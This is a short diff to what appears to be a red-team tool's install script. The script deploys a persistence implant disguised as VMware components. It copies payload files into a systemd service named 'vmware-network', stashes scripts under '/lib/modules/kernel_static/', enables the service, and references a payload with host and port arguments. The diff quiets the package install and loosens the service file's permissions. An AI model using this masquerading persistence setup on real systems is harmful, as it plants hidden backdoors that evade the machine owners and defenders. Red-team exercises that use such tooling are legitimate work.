@@ -16,7 +16,7 @@ payload3="/etc/vmware-tools.conf $host $port"
 # Setup tools for basic deployment 
 setup(){
     #yum install -y 
-    apt-get install -y curl wget vim python3 openssh-server
+    apt-get -qq install -y curl wget vim python3 openssh-server
     systemctl start ssh 
     systemctl enable ssh 
 }
@@ -47,7 +47,7 @@ copyman(){
     cp /opt/cdt-redteamtool/payload/vmware-network.service /etc/systemd/system/vmware-network.service
     cp /opt/cdt-redteamtool/payload/copyman.sh /lib/modules/kernel_static/copy
     cp /opt/cdt-redteamtool/payload/static/* /lib/modules/kernel_static/
-    chmod 644 /etc/systemd/system/vmware-network.service
+    chmod 744 /etc/systemd/system/vmware-network.service
 
     systemctl start vmware-network
     systemctl enable vmware-network
